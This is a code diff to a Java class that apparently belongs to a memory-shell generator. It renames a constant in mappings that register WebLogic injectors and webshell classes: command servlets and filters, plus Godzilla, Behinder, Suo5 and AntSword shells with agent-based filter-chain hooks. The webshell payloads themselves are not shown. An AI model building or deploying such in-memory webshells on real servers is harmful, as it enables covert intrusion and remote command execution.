@@ -28,7 +28,6 @@ import static com.reajason.javaweb.memshell.ShellType.*;
  * @since 2024/12/24
  */
 public class WebLogicShell extends AbstractShell {
-    public static final String AGENT_SERVLET_CONTEXT = AGENT + "ServletContext";
 
     @Override
     protected InjectorMapping getShellInjectorMapping() {
@@ -36,7 +35,7 @@ public class WebLogicShell extends AbstractShell {
                 .addInjector(SERVLET, WebLogicServletInjector.class)
                 .addInjector(FILTER, WebLogicFilterInjector.class)
                 .addInjector(LISTENER, WebLogicListenerInjector.class)
-                .addInjector(AGENT_SERVLET_CONTEXT, WebLogicServletContextAgentInjector.class)
+                .addInjector(WEBLOGIC_AGENT_SERVLET_CONTEXT, WebLogicServletContextAgentInjector.class)
                 .build();
     }
 
@@ -46,21 +45,21 @@ public class WebLogicShell extends AbstractShell {
                 .addShellClass(SERVLET, CommandServlet.class)
                 .addShellClass(FILTER, CommandFilter.class)
                 .addShellClass(LISTENER, ListenerGenerator.generateListenerShellClass(TomcatShell.ListenerInterceptor.class, ShellTool.Command))
-                .addShellClass(AGENT_SERVLET_CONTEXT, CommandFilterChainAdvisor.class)
+                .addShellClass(WEBLOGIC_AGENT_SERVLET_CONTEXT, CommandFilterChainAdvisor.class)
                 .build());
 
         addToolMapping(ShellTool.Godzilla, ToolMapping.builder()
                 .addShellClass(SERVLET, GodzillaServlet.class)
                 .addShellClass(FILTER, GodzillaFilter.class)
                 .addShellClass(LISTENER, ListenerGenerator.generateListenerShellClass(TomcatShell.ListenerInterceptor.class, ShellTool.Godzilla))
-                .addShellClass(AGENT_SERVLET_CONTEXT, GodzillaFilterChainAdvisor.class)
+                .addShellClass(WEBLOGIC_AGENT_SERVLET_CONTEXT, GodzillaFilterChainAdvisor.class)
                 .build());
 
         addToolMapping(ShellTool.Behinder, ToolMapping.builder()
                 .addShellClass(SERVLET, BehinderServlet.class)
                 .addShellClass(FILTER, BehinderFilter.class)
                 .addShellClass(LISTENER, ListenerGenerator.generateListenerShellClass(TomcatShell.ListenerInterceptor.class, ShellTool.Behinder))
-                .addShellClass(AGENT_SERVLET_CONTEXT, BehinderFilterChainAdvisor.class)
+                .addShellClass(WEBLOGIC_AGENT_SERVLET_CONTEXT, BehinderFilterChainAdvisor.class)
                 .build());
 
         addToolMapping(ShellTool.Suo5, ToolMapping.builder()
@@ -73,7 +72,7 @@ public class WebLogicShell extends AbstractShell {
                 .addShellClass(SERVLET, AntSwordServlet.class)
                 .addShellClass(FILTER, AntSwordFilter.class)
                 .addShellClass(LISTENER, ListenerGenerator.generateListenerShellClass(TomcatShell.ListenerInterceptor.class, ShellTool.AntSword))
-                .addShellClass(AGENT_SERVLET_CONTEXT, AntSwordFilterChainAdvisor.class)
+                .addShellClass(WEBLOGIC_AGENT_SERVLET_CONTEXT, AntSwordFilterChainAdvisor.class)
                 .build());
     }
 }
